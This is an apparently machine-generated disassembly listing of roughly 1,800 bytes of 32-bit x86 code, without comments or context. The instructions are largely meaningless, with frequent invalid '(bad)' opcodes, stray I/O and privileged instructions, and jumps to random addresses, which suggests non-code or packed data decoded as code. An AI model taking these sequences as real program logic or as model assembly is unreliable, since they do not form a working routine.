  409e8b:	lods   al,BYTE PTR ds:[esi]
  409e8c:	lods   eax,DWORD PTR ds:[esi]
  409e8d:	pop    eax
  409e8e:	mov    edi,0x9a5a52e0
  409e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e94:	pop    edx
  409e95:	fst    DWORD PTR [edi-0x6a]
  409e98:	push   ds
  409e99:	icebp  
  409e9a:	add    eax,DWORD PTR [esi]
  409e9c:	and    al,0x96
  409e9e:	leave  
  409e9f:	dec    edi
  409ea0:	sub    al,0xf6
  409ea2:	aaa    
  409ea3:	xor    eax,0xb72fb2b2
  409ea8:	push   ebx
  409ea9:	sub    DWORD PTR [edx+0x3054c708],edx
  409eaf:	iret   
  409eb0:	ja     0x409e8a
  409eb2:	(bad)  
  409eb3:	popa   
  409eb4:	mov    ds:0x959a5f84,eax
  409eb9:	js     0x409f08
  409ebb:	sahf   
  409ebc:	repz iret 
  409ebe:	push   es
  409ebf:	inc    ecx
  409ec0:	mov    ebp,cs
  409ec2:	shl    eax,1
  409ec4:	sar    BYTE PTR [eax],cl
  409ec6:	loope  0x409e6a
  409ec8:	pop    ecx
  409ec9:	add    DWORD PTR ds:0xef0dd35c,ebp
  409ecf:	jmp    0xaa360d7f
  409ed4:	stos   DWORD PTR es:[edi],eax
  409ed5:	fmul   QWORD PTR [esi-0x3ccbf42f]
  409edb:	cmp    ebx,DWORD PTR [edx+0x6b]
  409ede:	mov    edi,0x5fa0253d
  409ee3:	and    edi,edi
  409ee5:	cwde   
  409ee6:	ins    BYTE PTR es:[edi],dx
  409ee7:	mov    ch,0x8e
  409ee9:	popw   ds
  409eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eec:	loopne 0x409ecd
  409eee:	jo     0x409f09
  409ef0:	dec    esi
  409ef2:	(bad)  
  409ef3:	addr16 push esp
  409ef5:	shl    DWORD PTR [ebp+0x6d],1
  409ef8:	mov    esi,DWORD PTR [esi+0x55]
  409efb:	fcmovnb st,st(2)
  409efd:	outs   dx,BYTE PTR ds:[esi]
  409efe:	loope  0x409f4d
  409f00:	push   edx
  409f01:	lds    ebx,FWORD PTR [ebx-0x4]
  409f04:	push   ecx
  409f05:	cli    
  409f06:	(bad)  
  409f07:	cmp    esi,DWORD PTR [eax]
  409f09:	pop    esp
  409f0a:	push   ss
  409f0b:	or     al,0x10
  409f0d:	sti    
  409f0e:	loop   0x409f5e
  409f10:	xor    al,BYTE PTR [ecx+0x47]
  409f13:	repz in al,dx
  409f15:	push   ebp
  409f16:	int    0xcf
  409f18:	cmp    al,0xc4
  409f1a:	and    cl,BYTE PTR [edx]
  409f1c:	je     0x409f79
  409f1e:	add    BYTE PTR [esi-0x17c24cf5],cl
  409f24:	inc    eax
  409f25:	mov    al,ds:0x8c64ccf7
  409f2a:	inc    esp
  409f2b:	adc    esi,DWORD PTR [ecx-0x71ba6891]
  409f31:	jle    0x409fa7
  409f33:	add    DWORD PTR ds:0xe2b413b,esi
  409f39:	and    eax,0xbff37b6
  409f3e:	enter  0x9637,0x75
  409f42:	or     ecx,DWORD PTR [eax+0x42]
  409f45:	jecxz  0x409f76
  409f47:	sub    BYTE PTR [ebx-0x44a54f8e],cl
  409f4d:	jno    0x409ef4
  409f4f:	outs   dx,DWORD PTR ds:[esi]
  409f50:	(bad)  
  409f51:	sar    bh,1
  409f53:	xor    ah,BYTE PTR [edi+0x3ea7217]
  409f59:	pmulhw mm4,QWORD PTR [esi]
  409f5c:	xchg   ebp,eax
  409f5d:	dec    esp
  409f5e:	push   ds
  409f5f:	pop    esi
  409f60:	call   0x1c96a538
  409f65:	stos   DWORD PTR es:[edi],eax
  409f66:	xchg   esp,eax
  409f67:	adc    eax,DWORD PTR [ecx]
  409f69:	adc    al,0xc1
  409f6b:	arpl   WORD PTR [eax+0x5a078f6e],dx
  409f71:	dec    edi
  409f72:	repz in al,0x40
  409f75:	mov    ah,0x77
  409f77:	pop    ebx
  409f78:	xchg   edi,eax
  409f79:	inc    eax
  409f7a:	lock sbb BYTE PTR [edi+0x2170c2bb],bh
  409f81:	and    edx,DWORD PTR [esi+0x1a]
  409f84:	and    edi,ecx
  409f86:	lods   al,BYTE PTR ds:[esi]
  409f87:	sbb    eax,0xa14717ca
  409f8c:	mov    eax,0x88149c71
  409f91:	(bad)  
  409f92:	outs   dx,DWORD PTR ds:[esi]
  409f93:	push   cs
  409f94:	fdivp  st(2),st
  409f96:	push   ebx
  409f97:	pushf  
  409f98:	and    al,0xa5
  409f9a:	sbb    BYTE PTR [ebx-0x40bb2e64],bh
  409fa0:	mov    DWORD PTR [eax],edx
  409fa2:	mov    esp,0x92e70134
  409fa7:	inc    esp
  409fa8:	in     eax,dx
  409fa9:	fs sbb al,0x18
  409fac:	add    bh,BYTE PTR [esi+0x5c]
  409faf:	idiv   BYTE PTR [ebx+0x33df478c]
  409fb5:	xor    DWORD PTR [esi],ecx
  409fb7:	cmp    al,ah
  409fb9:	test   al,0x54
  409fbb:	mov    eax,ds:0x1ca829ab
  409fc0:	outs   dx,DWORD PTR ds:[esi]
  409fc1:	push   edi
  409fc2:	dec    eax
  409fc3:	cwde   
  409fc4:	fcom   QWORD PTR [ebx+0x36]
  409fc7:	loop   0x409fce
  409fc9:	jge    0x409fec
  409fcb:	push   es
  409fcc:	jmp    0x409f8a
  409fce:	jmp    0x55de5a49
  409fd3:	cmp    eax,0x34f76c1f
  409fd8:	in     eax,dx
  409fd9:	push   esi
  409fda:	or     esp,DWORD PTR [edi-0x56f85257]
  409fe0:	jmp    0x64f200
  409fe5:	jmp    0x409f6b
  409fe7:	sar    BYTE PTR [esi+ecx*4+0x1a515b65],0x69
  409fef:	mov    BYTE PTR [eax+0x35],dl
  409ff2:	add    dl,0x7
  409ff5:	addr16 xchg ebx,eax
  409ff7:	mov    dl,ah
  409ff9:	mov    esi,0x74c9729c
  409ffe:	and    esi,DWORD PTR [esi-0x55]
  40a001:	inc    eax
  40a002:	lods   eax,DWORD PTR ds:[esi]
  40a003:	(bad)  
  40a004:	pop    ebx
  40a005:	jl     0x40a01a
  40a007:	aam    0x65
  40a009:	(bad)  
  40a00a:	cmp    edx,DWORD PTR [eax-0x43883087]
  40a010:	or     eax,0x18395c38
  40a015:	inc    edi
  40a016:	test   al,0xfb
  40a018:	out    0x4a,eax
  40a01a:	test   DWORD PTR [ecx-0x2af54c72],esp
  40a020:	hlt    
  40a021:	mov    ecx,0x146fa963
  40a026:	call   0x7f8dced2
  40a02b:	adc    al,dl
  40a02d:	leave  
  40a02e:	or     esp,0x4256f048
  40a034:	pop    edx
  40a035:	gs cdq 
  40a037:	pushf  
  40a038:	test   DWORD PTR [edi],ebx
  40a03a:	fwait
  40a03b:	out    0x3e,eax
  40a03d:	test   BYTE PTR [eax-0x12],dh
  40a040:	js     0x40a031
  40a042:	test   WORD PTR [ecx+0x6a73e6e],di
  40a049:	in     eax,dx
  40a04a:	inc    esi
  40a04b:	imul   esp,ebp,0xffffff8d
  40a04e:	mov    ebx,0x56a5644a
  40a053:	into   
  40a054:	cld    
  40a055:	es jge 0x40a0d7
  40a058:	jo     0x40a059
  40a05a:	dec    ebx
  40a05b:	jg     0x40a048
  40a05d:	(bad)  
  40a05e:	cmp    eax,0xa71c0914
  40a063:	and    ecx,DWORD PTR [edx+0x37]
  40a066:	not    BYTE PTR [edi]
  40a068:	xchg   ecx,eax
  40a069:	mov    eax,ds:0x93384a8f
  40a06e:	mov    eax,0x9a47f21d
  40a073:	mov    edi,0x578e5f9e
  40a078:	push   0x9e4c7343
  40a07d:	mov    DWORD PTR ss:[ebx],esp
  40a080:	push   edx
  40a081:	jae    0x40a01d
  40a083:	mov    edi,0x90c152a9
  40a088:	push   eax
  40a089:	sub    BYTE PTR [edx],dh
  40a08b:	popf   
  40a08c:	adc    eax,DWORD PTR [edi+edi*4+0x7a]
  40a090:	dec    esi
  40a091:	push   ss
  40a092:	sub    BYTE PTR [ecx+0x3e],0x96
  40a096:	test   bh,bh
  40a098:	(bad)  
  40a099:	cmp    cl,BYTE PTR [edi-0x2fa37fa]
  40a09f:	aaa    
  40a0a0:	loopne 0x40a114
  40a0a2:	jmp    0x40a086
  40a0a4:	sbb    al,0x84
  40a0a6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40a0a8:	mov    eax,ds:0x9a9ac323
  40a0ad:	cmp    al,0x9e
  40a0af:	sub    BYTE PTR [ecx+ebx*8],0xcd
  40a0b3:	or     al,0x79
  40a0b6:	popa   
  40a0b7:	repz push ds
  40a0b9:	es sti 
  40a0bb:	mov    al,ds:0x2bcc36ca
  40a0c0:	aas    
  40a0c1:	pop    ebx
  40a0c2:	and    ah,0xc9
  40a0c5:	push   ds
  40a0c6:	mov    ecx,0x77c01fed
  40a0cb:	sub    DWORD PTR [edi-0x29c1b766],edx
  40a0d1:	and    eax,0x398d8fd3
  40a0d6:	shl    dl,cl
  40a0d8:	jle    0x40a136
  40a0da:	inc    eax
  40a0db:	sub    ebx,DWORD PTR [edi]
  40a0dd:	mov    es,eax
  40a0df:	jge    0x40a0bd
  40a0e1:	fdivr  st,st(7)
  40a0e3:	addr16 mov esp,0xf5f97bc7
  40a0e9:	in     al,0x67
  40a0eb:	aam    0xfb
  40a0ed:	xlat   BYTE PTR ds:[ebx]
  40a0ee:	dec    ecx
  40a0ef:	jmp    0x5a08:0x4f05c55a
  40a0f6:	mov    al,ds:0x65c85b98
  40a0fb:	sub    ecx,DWORD PTR [ecx]
  40a0fd:	and    ch,BYTE PTR [ecx-0x41afc754]
  40a103:	sti    
  40a104:	xor    bh,dl
  40a106:	mov    bl,0x50
  40a108:	ja     0x40a112
  40a10a:	retf   0xd3ff
  40a10d:	xor    al,ah
  40a10f:	adc    eax,0x40d9a8c6
  40a114:	inc    ecx
  40a115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a116:	mov    esp,0x4e17c9d5
  40a11b:	cmp    eax,0x12c091f3
  40a120:	jecxz  0x40a0a2
  40a122:	test   eax,0x85f1d61a
  40a127:	or     al,0x95
  40a129:	pop    edx
  40a12a:	in     al,dx
  40a12b:	pusha  
  40a12c:	addr16 xchg ebp,eax
  40a12e:	mov    eax,0x6d96d60f
  40a133:	ins    BYTE PTR es:[edi],dx
  40a134:	mov    ebx,0x4ae59864
  40a139:	jge    0x40a0ef
  40a13b:	aam    0xde
  40a13d:	leave  
  40a13e:	pop    esp
  40a13f:	imul   eax,DWORD PTR [esi],0x35253a72
  40a145:	push   edx
  40a146:	push   0xffffffd2
  40a148:	shr    DWORD PTR [edi-0x58be5dae],cl
  40a14e:	mov    eax,edx
  40a150:	outs   dx,DWORD PTR ds:[esi]
  40a151:	stos   BYTE PTR es:[edi],al
  40a152:	push   ss
  40a153:	pop    esp
  40a154:	push   esi
  40a155:	inc    ebp
  40a156:	and    dl,ch
  40a158:	inc    BYTE PTR ds:0xd178bbe0
  40a15e:	xchg   ebp,eax
  40a15f:	aas    
  40a160:	xchg   esi,eax
  40a161:	and    al,cl
  40a163:	stos   DWORD PTR es:[edi],eax
  40a164:	mov    bh,0x4e
  40a166:	or     eax,0xa04e2614
  40a16b:	sub    al,0x24
  40a16d:	gs addr16 or ah,0x63
  40a172:	mov    edi,0xb3bbbc27
  40a177:	arpl   WORD PTR ds:0xe4a8aeb5,si
  40a17d:	push   eax
  40a17e:	lods   al,BYTE PTR ds:[esi]
  40a17f:	(bad)  
  40a180:	and    DWORD PTR [esp+ebp*1],eax
  40a183:	fcmovu st,st(6)
  40a185:	imul   edx,DWORD PTR [edx-0x7e],0xffffffe2
  40a189:	inc    edx
  40a18a:	add    esp,DWORD PTR [esi+edi*8]
  40a18d:	and    BYTE PTR [ecx],dl
  40a18f:	in     al,0xe5
  40a191:	mov    ecx,0xdd2a5ede
  40a196:	rcl    DWORD PTR [eax-0x3efa3a5f],cl
  40a19c:	pop    eax
  40a19d:	xor    eax,DWORD PTR [ebx+0x4a]
  40a1a0:	sub    al,0x1b
  40a1a2:	scas   eax,DWORD PTR es:[edi]
  40a1a3:	shr    DWORD PTR [edx+0x42],0xb4
  40a1a7:	pop    esi
  40a1a8:	mov    cl,0xd0
  40a1aa:	fdivr  DWORD PTR [edx+0xb]
  40a1ad:	xor    BYTE PTR [ebp+0x14],dh
  40a1b0:	inc    ebp
  40a1b1:	fcomp  QWORD PTR [esi+0x54e57c67]
  40a1b7:	repnz mov ebp,0x63bb30b9
  40a1bd:	push   ebp
  40a1be:	mov    dh,0x8a
  40a1c0:	sbb    al,0xa8
  40a1c2:	clc    
  40a1c3:	mov    bl,0x68
  40a1c5:	(bad)  
  40a1c6:	cmc    
  40a1c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1c8:	shl    BYTE PTR [ebx+0x2f7b9b62],cl
  40a1ce:	cmp    DWORD PTR [edx+ecx*4+0x1b5097e1],0xefbc4beb
  40a1d9:	jge    0x40a163
  40a1db:	ins    DWORD PTR es:[edi],dx
  40a1dc:	and    esi,eax
  40a1de:	sti    
  40a1df:	into   
  40a1e0:	imul   ebx,ebx,0xa2bf5780
  40a1e6:	mov    WORD PTR [edx+0x24],?
  40a1e9:	inc    edi
  40a1ea:	dec    esi
  40a1eb:	ja     0x40a1eb
  40a1ed:	ficom  WORD PTR [eax]
  40a1ef:	jg     0x40a258
  40a1f1:	push   ds
  40a1f2:	mov    ds:0x4adbf7b4,eax
  40a1f7:	adc    ebp,ecx
  40a1f9:	lods   eax,DWORD PTR ds:[esi]
  40a1fa:	mov    al,ds:0x5e0bdcc6
  40a1ff:	in     eax,0xab
  40a201:	rcl    BYTE PTR ds:0x68108c74,0x7d
  40a208:	mov    cl,al
  40a20a:	mov    bh,0x24
  40a20c:	aaa    
  40a20d:	fwait
  40a20e:	pop    esp
  40a20f:	popf   
  40a210:	sub    edx,ebp
  40a212:	inc    ebx
  40a213:	int    0x94
  40a215:	aam    0xbd
  40a217:	mov    ebp,0x3918b4c3
  40a21c:	xchg   bh,bh
  40a21e:	pop    ebp
  40a21f:	push   cs
  40a220:	or     al,0x18
  40a222:	mov    ah,0xc0
  40a224:	xor    DWORD PTR [edi+ebx*1-0x2a],eax
  40a228:	(bad)  
  40a229:	(bad)  [ecx]
  40a22b:	sbb    eax,0x57e5447e
  40a230:	aad    0x50
  40a232:	lock (bad) 
  40a234:	hlt    
  40a235:	inc    edx
  40a236:	out    dx,eax
  40a237:	adc    BYTE PTR [edi],bl
  40a239:	add    al,BYTE PTR [ecx]
  40a23b:	push   edx
  40a23c:	cmp    BYTE PTR [ebp+0x33],bh
  40a23f:	(bad)  
  40a240:	popf   
  40a241:	cmp    al,0xb2
  40a243:	test   BYTE PTR [edi],bl
  40a245:	popa   
  40a246:	xchg   ecx,eax
  40a247:	or     cl,al
  40a249:	(bad)  
  40a24a:	(bad)
  40a24e:	sbb    eax,0xb1e0e390
  40a253:	or     edi,DWORD PTR [esi+0x1266f6c4]
  40a259:	jmp    0x6bfe:0x23bce364
  40a260:	sti    
  40a261:	xor    al,BYTE PTR [ecx+0x287a5503]
  40a267:	pop    esp
  40a268:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a26b:	les    esi,FWORD PTR [eax]
  40a26d:	ins    BYTE PTR es:[edi],dx
  40a26e:	(bad)  
  40a26f:	ins    DWORD PTR es:[edi],dx
  40a270:	fldcw  WORD PTR [esi]
  40a272:	mov    dl,0x8e
  40a274:	ja     0x40a220
  40a276:	aas    
  40a277:	fwait
  40a278:	ins    DWORD PTR es:[edi],dx
  40a279:	lock add al,0xf7
  40a27c:	pop    edx
  40a27d:	add    al,0x14
  40a27f:	es pushf 
  40a281:	ins    DWORD PTR es:[edi],dx
  40a282:	int3   
  40a283:	(bad)  
  40a284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a285:	and    cl,0xd5
  40a288:	pop    edi
  40a289:	call   0xef4a:0x6f887c2f
  40a290:	sub    eax,0x1b6fa87e
  40a295:	adc    ecx,DWORD PTR [edi+ecx*1-0x156b2544]
  40a29c:	test   al,0x49
  40a29e:	mov    ebx,0x531969e6
  40a2a3:	push   ecx
  40a2a4:	in     eax,dx
  40a2a5:	add    DWORD PTR [edx-0x7a],esi
  40a2a8:	ja     0x40a26e
  40a2aa:	adc    al,0x1e
  40a2ad:	aaa    
  40a2ae:	and    al,0x28
  40a2b0:	inc    edi
  40a2b1:	outs   dx,BYTE PTR ds:[esi]
  40a2b2:	es dec esp
  40a2b4:	std    
  40a2b5:	inc    edi
  40a2b6:	popf   
  40a2b7:	daa    
  40a2b8:	xchg   ebx,eax
  40a2b9:	xchg   cl,bh
  40a2bb:	jns    0x40a2ad
  40a2bd:	(bad)  
  40a2bf:	lock cmp DWORD PTR ds:0x7ed515b9,edi
  40a2c6:	inc    esp
  40a2c7:	repnz daa 
  40a2c9:	push   ss
  40a2ca:	and    eax,0xbb17a144
  40a2cf:	xlat   BYTE PTR ds:[ebx]
  40a2d0:	daa    
  40a2d1:	dec    esi
  40a2d2:	cdq    
  40a2d3:	cmp    BYTE PTR [esi+0xa],ah
  40a2d6:	les    esp,FWORD PTR [edx-0x4d]
  40a2d9:	push   ecx
  40a2da:	lods   al,BYTE PTR ds:[esi]
  40a2db:	inc    BYTE PTR [ebx+0x30]
  40a2de:	xchg   edi,eax
  40a2df:	add    al,0x5a
  40a2e1:	xchg   cx,ax
  40a2e3:	fxch   st(5)
  40a2e5:	icebp  
  40a2e6:	pop    edi
  40a2e7:	jmp    FWORD PTR [eax-0x6f]
  40a2ea:	and    al,0xf1
  40a2ec:	xchg   edi,eax
  40a2ed:	pop    ss
  40a2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2ef:	push   ebx
  40a2f0:	cli    
  40a2f1:	rcr    al,cl
  40a2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2f4:	lock sub DWORD PTR [ebx-0x55685499],ebp
  40a2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2fc:	cmp    DWORD PTR [esp+eax*4+0x20],ebp
  40a300:	imul   DWORD PTR [ebp+0x5cacc8c1]
  40a306:	(bad)
  40a30a:	in     al,0xba
  40a30c:	je     0x40a31f
  40a30e:	jne    0x40a2f7
  40a310:	xchg   esi,eax
  40a311:	stos   BYTE PTR es:[edi],al
  40a312:	jmp    0xb5bb:0x5b49b9ef
  40a319:	xlat   BYTE PTR ds:[ebx]
  40a31a:	jecxz  0x40a34d
  40a31c:	jge    0x40a30c
  40a31e:	pop    esp
  40a31f:	xchg   ecx,eax
  40a320:	fcom   QWORD PTR ds:0x96d0e4a5
  40a326:	and    bh,BYTE PTR [ebx-0x31]
  40a329:	inc    eax
  40a32a:	(bad)  
  40a32b:	jge    0x40a39f
  40a32d:	(bad)  
  40a32e:	jp     0x40a2f2
  40a330:	jmp    0x341e72b2
  40a335:	ror    BYTE PTR [edx+esi*4-0x4b9fb7b4],cl
  40a33c:	xchg   ebx,eax
  40a33d:	es push 0xffffffae
  40a340:	jg     0x40a2ca
  40a342:	test   eax,0xb70b8a1e
  40a347:	rcl    BYTE PTR [ebx],1
  40a349:	mov    ebx,0xe9f1dccb
  40a34e:	push   0xffffffd9
  40a350:	push   ebx
  40a351:	adc    ch,ch
  40a353:	mul    BYTE PTR [eax-0x623c72ec]
  40a359:	loope  0x40a36c
  40a35b:	mov    esi,0x48722706
  40a360:	dec    edx
  40a361:	xor    al,0x7
  40a363:	idiv   BYTE PTR [ebx]
  40a365:	loopne 0x40a316
  40a367:	fdivr  st,st(7)
  40a369:	cmc    
  40a36a:	push   esi
  40a36b:	fwait
  40a36c:	in     eax,0xa5
  40a36e:	or     al,0x27
  40a370:	sub    DWORD PTR [esi+0x92eda81],ebp
  40a376:	push   0xf13b5bf7
  40a37b:	(bad)  [ebp+0x44bad07a]
  40a381:	add    ebx,edx
  40a383:	dec    ecx
  40a384:	retf   0x825a
  40a387:	test   ecx,ecx
  40a389:	dec    edi
  40a38a:	int    0x5f
  40a38c:	sahf   
  40a38d:	mov    ecx,0xc8c1473e
  40a392:	push   0x2ba8f2c6
  40a397:	int    0xdc
  40a399:	bound  ecx,QWORD PTR [ecx-0x50]
  40a39c:	push   edi
  40a39d:	dec    eax
  40a39e:	ins    DWORD PTR es:[edi],dx
  40a39f:	xor    BYTE PTR [esi-0x26b5fd4f],cl
  40a3a5:	sbb    esp,DWORD PTR [ebp-0x2b1f011a]
  40a3ab:	into   
  40a3ac:	loope  0x40a37b
  40a3ae:	enter  0xa418,0xa7
  40a3b2:	pop    edx
  40a3b3:	addr16 mov ch,0xef
  40a3b6:	imul   eax,DWORD PTR [edx],0xbbb566bc
  40a3bc:	fild   DWORD PTR ds:0x9964aa4d
  40a3c2:	rol    BYTE PTR [edi-0x62556a83],1
  40a3c8:	ins    BYTE PTR es:[edi],dx
  40a3c9:	xchg   dh,bl
  40a3cb:	and    DWORD PTR ds:0xf731faea,ebp
  40a3d1:	adc    al,0x2d
  40a3d3:	dec    edi
  40a3d4:	sbb    dh,BYTE PTR [esi+0x1]
  40a3d7:	xor    al,0xa7
  40a3d9:	push   0x8dd5b540
  40a3de:	jns    0x40a412
  40a3e0:	pushf  
  40a3e1:	lods   al,BYTE PTR ds:[esi]
  40a3e2:	xchg   esi,eax
  40a3e3:	jge    0x40a3b1
  40a3e5:	jo     0x40a3d3
  40a3e7:	xchg   esi,eax
  40a3e8:	jmp    0x928:0x8d272dc0
  40a3ef:	repnz pop eax
  40a3f1:	jl     0x40a390
  40a3f3:	stos   DWORD PTR es:[edi],eax
  40a3f4:	aad    0xff
  40a3f6:	mov    al,0x48
  40a3f8:	(bad)  
  40a3fa:	pop    ds
  40a3fb:	sub    al,cl
  40a3fd:	or     BYTE PTR [esi],bl
  40a3ff:	ret    
  40a400:	in     al,dx
  40a401:	int3   
  40a402:	and    ebp,esp
  40a404:	(bad)  
  40a405:	jno    0x40a3c6
  40a407:	fisubr DWORD PTR [edi-0x40]
  40a40a:	add    DWORD PTR [ecx-0x2],edi
  40a40d:	aaa    
  40a40e:	sub    ebx,DWORD PTR [esp+eiz*4]
  40a411:	outs   dx,BYTE PTR ds:[esi]
  40a412:	pop    ecx
  40a413:	std    
  40a414:	push   es
  40a415:	pop    ss
  40a416:	ret    
  40a417:	mov    BYTE PTR [ecx+eiz*8-0x39db6dac],cl
  40a41e:	fwait
  40a41f:	scas   eax,DWORD PTR es:[edi]
  40a420:	fwait
  40a421:	lock add eax,0x73a34e3b
  40a427:	popf   
  40a428:	xchg   esi,eax
  40a429:	mov    ecx,0xa20ac2ce
  40a42e:	dec    ecx
  40a42f:	shl    BYTE PTR [edx-0x25aedfbd],cl
  40a435:	jae    0x40a444
  40a437:	stc    
  40a438:	push   eax
  40a439:	xchg   BYTE PTR [edi-0x231aef29],ah
  40a43f:	imul   ecx,ecx,0x3c
  40a442:	call   0x383e0b20
  40a447:	add    ebx,esi
  40a449:	iret   
  40a44a:	mov    ah,0xc4
  40a44c:	push   cs
  40a44d:	dec    ebp
  40a44e:	add    ebx,DWORD PTR [edx]
  40a450:	or     BYTE PTR [eax-0x51dd0e53],cl
  40a456:	mov    ecx,0x2aae3a91
  40a45b:	shl    ebp,1
  40a45d:	xchg   edi,eax
  40a45e:	jmp    0x40a49c
  40a460:	inc    eax
  40a461:	scas   eax,DWORD PTR es:[edi]
  40a462:	fdiv   DWORD PTR [edi+0x53]
  40a465:	mov    ch,0x31
  40a467:	pushf  
  40a468:	scas   eax,DWORD PTR es:[edi]
  40a469:	sbb    BYTE PTR [ecx+0x7c839a7d],dh
  40a46f:	leave  
  40a470:	clc    
  40a471:	pop    ecx
  40a472:	cdq    
  40a473:	push   eax
  40a474:	fsubr  QWORD PTR [eax-0xb330f7e]
  40a47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a47b:	cli    
  40a47c:	sbb    eax,0xb423f4d
  40a481:	xlat   BYTE PTR ds:[ebx]
  40a482:	in     al,dx
  40a483:	add    eax,0x3f78212c
  40a488:	sub    DWORD PTR [esi],ebx
  40a48a:	jno    0x40a4d8
  40a48c:	jnp    0x40a44d
  40a48e:	hlt    
  40a48f:	pop    ds
  40a490:	dec    ebp
  40a491:	rol    BYTE PTR [edi+0x66],1
  40a494:	inc    edi
  40a495:	ret    
  40a496:	xchg   ebx,eax
  40a497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a498:	ret    
  40a499:	and    DWORD PTR [ecx+0x1d],esp
  40a49c:	neg    al
  40a49e:	aam    0xa4
  40a4a0:	pusha  
  40a4a1:	and    edi,eax
  40a4a3:	retf   0x52b7
  40a4a6:	jnp    0x40a518
  40a4a8:	dec    esp
  40a4a9:	imul   ecx,edi,0xfe6ec8e6
  40a4af:	fwait
  40a4b0:	push   ss
  40a4b1:	sub    DWORD PTR [edi+edi*8],ebx
  40a4b4:	cmp    esi,DWORD PTR [eax-0xd3a10e0]
  40a4ba:	inc    ebx
  40a4bb:	inc    esi
  40a4bc:	xchg   ebp,eax
  40a4bd:	dec    ebx
  40a4be:	xchg   ecx,eax
  40a4bf:	aam    0x7f
  40a4c1:	pop    esi
  40a4c2:	xor    DWORD PTR [eax],ebx
  40a4c4:	cld    
  40a4c5:	dec    esi
  40a4c6:	fld    DWORD PTR [eax-0x2b]
  40a4c9:	into   
  40a4ca:	call   0xfb53:0xc499f5ba
  40a4d1:	add    BYTE PTR [ebx+ecx*4-0x50],dl
  40a4d5:	js     0x40a535
  40a4d7:	xor    al,ah
  40a4d9:	pop    esi
  40a4da:	mov    fs,WORD PTR [edi+0x3e13b46]
  40a4e0:	add    ebp,ebp
  40a4e2:	dec    ebp
  40a4e3:	mov    WORD PTR [eax-0x42],cs
  40a4e6:	cmc    
  40a4e7:	(bad)  
  40a4e8:	push   cs
  40a4e9:	jmp    0x40a476
  40a4eb:	call   0xb9fc4875
  40a4f0:	lock jb 0x40a479
  40a4f3:	ss xor al,0x6b
  40a4f6:	sar    BYTE PTR [edx+0x28],0x57
  40a4fa:	ins    BYTE PTR es:[edi],dx
  40a4fb:	es mov esp,0x7df55e0
  40a501:	xor    DWORD PTR [eax],ecx
  40a503:	xor    al,BYTE PTR [esi+0x71]
  40a506:	or     al,0x49
  40a508:	xor    bl,0x95
  40a50b:	xor    al,0xc8
  40a50d:	lods   eax,DWORD PTR ds:[esi]
  40a50e:	sahf   
  40a50f:	out    dx,al
  40a510:	ins    BYTE PTR es:[edi],dx
  40a511:	xchg   DWORD PTR [edi-0x24],esp
  40a514:	sub    bh,0x9d
  40a517:	gs sub al,0x82
  40a51a:	adc    eax,0xbbcbfb1e
  40a51f:	xchg   esi,eax
  40a520:	lock cmp al,0x86
  40a523:	(bad)  
  40a524:	fisubr DWORD PTR [eax+0x30]
  40a527:	daa    
  40a528:	daa    
  40a529:	fist   DWORD PTR [edi+0x60]
  40a52c:	mov    ebp,0xe9c26a27
  40a531:	pop    esi
  40a532:	les    eax,FWORD PTR ds:0x4506c87
  40a538:	shl    edx,0x8a
  40a53b:	or     ch,BYTE PTR [ecx-0x6105cdcb]
  40a541:	retf   0x8da6
  40a544:	addr16 mov al,ds:0xa184
  40a548:	test   DWORD PTR [ecx],ebp
  40a54a:	pusha  
  40a54b:	dec    eax
  40a54c:	xchg   esi,eax
  40a54d:	loop   0x40a5c6
  40a54f:	lods   al,BYTE PTR ds:[esi]
  40a550:	dec    edi
  40a551:	cmp    BYTE PTR [ebp+0x76],0x9c
  40a555:	test   al,0x9a
  40a557:	lods   al,BYTE PTR ds:[esi]
  40a558:	jne    0x40a516
  40a55a:	jmp    0x418e8eeb
  40a55f:	popfw  
  40a561:	in     al,0xd2
  40a563:	dec    edx
  40a564:	xlat   BYTE PTR ds:[ebx]
  40a565:	bound  edx,QWORD PTR [ecx+0x18]
  40a568:	test   ah,al
  40a56a:	pop    ss
  40a56b:	mov    DWORD PTR [ebp+0x7b],edi
  40a56e:	push   ecx
  40a56f:	mov    ah,0x4
  40a571:	push   ss
  40a572:	fisubr WORD PTR [edx-0x6830f305]
  40a578:	add    dl,BYTE PTR [esp+eax*8-0x51b92477]
  40a57f:	push   esi
  40a580:	jle    0x40a507
  40a582:	fistp  DWORD PTR [ebx-0x3c]
  40a585:	clc    
  40a586:	dec    ebp
  40a587:	lds    edx,FWORD PTR [esi+0x5b]
  40a58a:	push   edi
  40a58b:	dec    esp
  40a58d:	pop    esp
  40a58e:	xor    bl,BYTE PTR [esi+0x4f]
  40a591:	dec    edx
  40a593:	mov    bl,0x6a
  40a595:	mov    WORD PTR [edi],gs
  40a597:	nop
  40a598:	xchg   BYTE PTR [eax+ecx*4+0x50acbf92],ch
  40a59f:	test   BYTE PTR [edx+0x51],0x29
  40a5a3:	(bad)  
  40a5a4:	mov    cl,0x35
  40a5a6:	fsubp  st(2),st
  40a5a8:	clc    
  40a5a9:	and    eax,0x12c8fd44
  40a5ae:	jbe    0x40a546
  40a5b0:	or     eax,0x3765ce63
  40a5b5:	ror    DWORD PTR [ebx-0x31],0x59
  40a5b9:	cmp    ebp,DWORD PTR [ebp+0x54]
  40a5bc:	and    edx,DWORD PTR [ebx+0x44]
  40a5bf:	add    esp,ebx
  40a5c1:	add    eax,0x99f51b67
  40a5c6:	dec    esp
  40a5c7:	repnz dec ecx
  40a5c9:	shr    BYTE PTR [edi],1
  40a5cb:	clc    
  40a5cc:	arpl   WORD PTR [ebp+0x530258ff],ax
  40a5d2:	push   ecx
  40a5d3:	aad    0x6
  40a5d5:	pop    esp
  40a5d6:	rcr    BYTE PTR [ecx+eiz*1-0x7e9c9600],0xd0
  40a5de:	jbe    0x40a597
  40a5e0:	and    al,0x37
